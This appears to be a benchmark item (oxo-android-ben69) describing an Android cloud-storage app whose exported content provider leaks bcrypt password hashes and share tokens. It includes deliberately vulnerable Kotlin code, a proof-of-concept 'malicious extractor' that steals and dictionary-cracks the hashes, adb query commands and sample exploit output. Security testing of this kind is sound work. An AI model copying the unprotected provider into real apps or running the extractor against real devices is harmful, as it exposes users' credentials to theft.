# oxo-android-ben69: Authentication Token and Password Hash Extraction via Content Provider

## Vulnerability Overview

Authentication Token and Password Hash Extraction occurs when Android applications store sensitive authentication data (bcrypt hashes, share tokens, session identifiers) in content providers without proper access controls, allowing malicious apps to extract authentication credentials for offline attacks and unauthorized access.

## Attack Vector: Content Provider Authentication Data Extraction

**Brief Explanation**: A cloud storage or collaboration app that exposes authentication tokens, bcrypt password hashes for shared files, and share identifiers through an unprotected content provider. Malicious apps can directly query the content provider to extract authentication data, enabling offline password cracking and bypassing server-side brute force protections.

**Key Characteristics:**
- Bcrypt password hashes stored in accessible content provider
- Authentication tokens and share identifiers exposed without permissions
- Direct content provider queries to extract sensitive authentication data
- Offline password cracking capability bypassing server protections
- Unauthorized access to password-protected shared resources

**Vulnerable Code Pattern:**
```kotlin
// VULNERABLE: Cloud storage app with exposed share authentication data
class MainActivity : ComponentActivity() {
    fun createShareWithPassword(shareUrl: String, password: String) {
        val bcryptHash = BCrypt.hashpw(password, BCrypt.gensalt(12))
        val shareToken = UUID.randomUUID().toString()
        val expirationTime = System.currentTimeMillis() + (24 * 60 * 60 * 1000) // 24 hours
        
        // VULNERABLE: Store sensitive authentication data in content provider
        val shareData = ShareData(
            token = shareToken,
            shareWith = bcryptHash,  // bcrypt password hash
            userId = getCurrentUserId(),
            expiration = expirationTime,
            shareUrl = shareUrl
        )
        
        // Store in vulnerable content provider
        storeShareData(shareData)
    }
}

// VULNERABLE: Exported share provider without permissions
<provider
    android:name=".providers.ShareContentProvider"
    android:authorities="com.cloudapp.shares"
    android:exported="true" />

class ShareContentProvider : ContentProvider() {
    override fun query(uri: Uri, projection: Array<String>?, selection: String?, 
                      selectionArgs: Array<String>?, sortOrder: String?): Cursor? {
        val cursor = MatrixCursor(arrayOf("_id", "token", "share_with", "user_id", "expiration"))
        // NO PERMISSION CHECK - Returns bcrypt hashes and tokens
        database.query("shares", null, null, null, null).use { dbCursor ->
            while (dbCursor.moveToNext()) {
                cursor.addRow(arrayOf(
                    dbCursor.getInt("id"),
                    dbCursor.getString("token"),        // Share identifier  
                    dbCursor.getString("share_with"),   // bcrypt password hash
                    dbCursor.getInt("user_id"),
                    dbCursor.getLong("expiration")
                ))
            }
        }
        return cursor
    }
}
```

**Malicious Extractor Code:**
```kotlin
// MALICIOUS: Extracts authentication data for offline attacks
class AuthenticationExtractorReceiver : BroadcastReceiver() {
    fun stealAuthenticationData(context: Context) {
        // Query vulnerable content provider for shares
        val shareUri = Uri.parse("content://com.cloudapp.shares/shares")
        val cursor = context.contentResolver.query(shareUri, null, null, null, null)
        
        cursor?.use {
            while (it.moveToNext()) {
                val shareId = it.getInt(it.getColumnIndex("_id"))
                val token = it.getString(it.getColumnIndex("token"))
                val bcryptHash = it.getString(it.getColumnIndex("share_with"))
                val userId = it.getInt(it.getColumnIndex("user_id"))
                val expiration = it.getLong(it.getColumnIndex("expiration"))
                
                // STOLEN: Authentication tokens and password hashes
                Log.d("AUTH_STOLEN", "Share ID: $shareId, Token: $token")
                Log.d("AUTH_STOLEN", "Bcrypt Hash: $bcryptHash")
                Log.d("AUTH_STOLEN", "User: $userId, Expires: $expiration")
                
                // Perform offline password cracking on extracted hashes
                performOfflineBruteForce(token, bcryptHash, userId)
            }
        }
    }
    
    private fun performOfflineBruteForce(token: String, hash: String, userId: Int) {
        // ATTACK: Offline password cracking bypassing server protections
        val commonPasswords = listOf("123456", "password", "admin", "qwerty", "letmein")
        
        commonPasswords.forEach { password ->
            if (BCrypt.checkpw(password, hash)) {
                Log.d("PASSWORD_CRACKED", "Token: $token, Password: $password")
                // Use cracked password with token for unauthorized access
                accessProtectedShare(token, password)
            }
        }
    }
}
```
## Testing

```bash
# Install the vulnerable cloud storage app
adb install -r oxo-android-ben69.apk

# Launch CloudShare Pro
adb shell am start -n com.cloudapp/.MainActivity

# Create shared files with password protection (use the app UI)
# This will generate bcrypt hashes and store them in the content provider

# Check if authentication data is accessible via content provider
adb shell content query --uri content://com.cloudapp.shares/shares

# Query specific share authentication data
adb shell content query --uri content://com.cloudapp.shares/shares/1

# Extract all bcrypt hashes and tokens
adb shell content query --uri content://com.cloudapp.shares/shares --projection token,share_with,user_id

# Simulate malicious app extracting authentication data
python3 exploit_auth_extraction.py

# Monitor for authentication data extraction in logs
adb logcat -s AUTH_STOLEN:D PASSWORD_CRACKED:D

# Verify content provider exports authentication data without permission checks
adb shell dumpsys package com.cloudapp | grep -A 10 "ContentProvider"
```

**Expected Results:**
```
Content Provider Query:
Row: 0 _id=1, token=abc123xyz789, share_with=$2b$12$xyz.../encrypted_hash, user_id=456, expiration=1693209600000
Row: 1 _id=2, token=def456uvw012, share_with=$2b$12$abc.../password_hash, user_id=789, expiration=1693296000000

Extracted Authentication Data:
Token: abc123xyz789
Bcrypt Hash: $2b$12$KIXQQgmTtGWqrPPKmynHLeFRvtUFXdI.Wh.RO8gzUGYjE7J4L2GN6
User ID: 456
Expiration: 1693209600000

Exploit Test Output:
[+] Authentication data found: 2 shares with bcrypt hashes
[+] Token extracted: abc123xyz789
[+] Hash extracted: $2b$12$KIXQQgmTtGWqrPPKmynHLeFRvtUFXdI.Wh.RO8gzUGYjE7J4L2GN6
[!] VULNERABILITY CONFIRMED: Authentication credentials exposed
[+] Starting offline password cracking...
[+] PASSWORD CRACKED: Token abc123xyz789, Password: admin123
```

**Difficulty**: Medium

## Impact Assessment

- **Confidentiality**: Critical - Complete exposure of authentication tokens and password hashes enabling unauthorized access
- **Integrity**: High - Compromised authentication can lead to unauthorized data modification and sharing
- **Availability**: Medium - Authentication bypass can lead to resource abuse and denial of service
- **OWASP Mobile Top 10**: M2 - Insecure Data Storage, M4 - Insecure Authentication, M6 - Insecure Authorization
- **CWE**: CWE-200 (Information Exposure), CWE-256 (Unprotected Storage of Credentials), CWE-284 (Improper Access Control)

## Authentication Data Extraction Attack Scenarios

1. **Offline Password Cracking**: Extract bcrypt hashes for offline brute force attacks bypassing server protections
2. **Authentication Token Hijacking**: Steal share tokens to access password-protected content without passwords
3. **Credential Database Building**: Collect authentication data for password reuse attacks across services
4. **Corporate Data Breach**: Access business documents and shared files through extracted authentication data
5. **Privacy Violation**: Unauthorized access to personal files, photos, and sensitive documents

**Example Attack Flow:**
```bash
# 1. User creates password-protected shares in cloud storage app
# 2. App generates bcrypt hashes and stores them in content provider
# 3. Malicious app installs without requesting any special permissions
# 4. Malicious app queries content provider to extract all authentication data
# 5. Bcrypt hashes and tokens extracted for offline password cracking
# 6. Common passwords tested against hashes using offline tools
# 7. Cracked passwords combined with tokens for unauthorized share access
# 8. Complete bypass of server-side authentication and brute force protection
```

This vulnerability demonstrates how authentication mechanisms can be completely bypassed through content provider data exposure, enabling attackers to access password-protected content without triggering any server-side security measures.
